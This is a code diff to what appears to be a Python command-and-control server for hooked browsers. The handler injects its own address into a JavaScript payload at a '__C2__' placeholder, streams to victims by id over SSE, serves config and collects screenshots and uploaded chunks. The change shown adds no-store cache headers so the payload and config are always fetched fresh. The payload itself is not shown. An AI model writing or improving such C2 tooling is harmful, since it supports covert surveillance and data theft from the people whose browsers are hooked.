@@ -324,11 +324,14 @@ def _stale_watcher():
 
 class Handler(http.server.BaseHTTPRequestHandler):
     def log_message(self, *a): pass
-    def _send(self, code, ctype, body):
+    def _send(self, code, ctype, body, no_store=False):
         self.send_response(code)
         self.send_header("Content-Type", ctype)
         self.send_header("Access-Control-Allow-Origin", "*")
         self.send_header("Access-Control-Allow-Headers", "*")
+        if no_store:
+            self.send_header("Cache-Control", "no-store")
+            self.send_header("Pragma", "no-cache")
         self.send_header("Content-Length", str(len(body)))
         self.end_headers(); self.wfile.write(body)
 
@@ -346,7 +349,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
             xfp = (self.headers.get("X-Forwarded-Proto") or "").split(",")[0].strip().lower()
             proto = xfp or ("https" if isinstance(self.connection, ssl.SSLSocket) else "http")
             js = open(PAYLOAD).read().replace("__C2__", f"{proto}://{host}")
-            self._send(200, "application/javascript", js.encode())
+            self._send(200, "application/javascript", js.encode(), no_store=True)
         elif p == "/sse":
             vid = sanitize_vid(q.get("id", [""])[0])
             self.connection.settimeout(15)   # 좀비 연결 조기 감지
@@ -390,7 +393,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
                                        "received": chunks_count, "total": total}).encode())
         elif p == "/config":
             with LOCK:
-                self._send(200, "application/json", json.dumps(CONFIG, ensure_ascii=False).encode())
+                self._send(200, "application/json", json.dumps(CONFIG, ensure_ascii=False).encode(), no_store=True)
         elif p == "/api/screenshot":
             vid = sanitize_vid(q.get("id", [""])[0])
             with LOCK:
